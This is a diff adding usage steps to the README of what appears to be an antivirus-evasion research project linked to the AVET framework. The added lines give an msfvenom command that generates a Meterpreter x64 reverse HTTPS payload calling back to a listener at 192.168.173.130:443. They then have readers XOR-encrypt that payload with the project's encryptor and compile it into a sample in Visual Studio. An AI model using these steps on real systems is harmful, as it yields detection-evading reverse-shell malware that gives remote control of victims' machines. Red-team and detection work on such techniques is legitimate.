@@ -35,6 +35,14 @@ These techniques have been integrated by the author within the AVET framework av
 
 The payload used is stageless Meterpreter x64 reverse HTTPS payload that employs a basic XOR encryption is used. This has to be replaced if you want to use your payload with the right IP address.
 
+To do so:
+- Generate your payload using **msfvenom** : `msfvenom -p windows/x64/meterpreter_reverse_https lhost=192.168.173.130 lport=443 -f c > payload.h`
+- Take the file newly generated and give it as input to the executable `XOR_encryptor.exe`, this can be used with the following command : `.\XOR_encryptor.exe payload.h <output_file_name>` for example in our case the output filename is `buffer.h `
+- Add the newly generated file into Visual Studio. Then include the file into the sample of your choice.
+You should be ready to go !
+
+
+
 ## Utils
 
 For xoring the payload we used ...
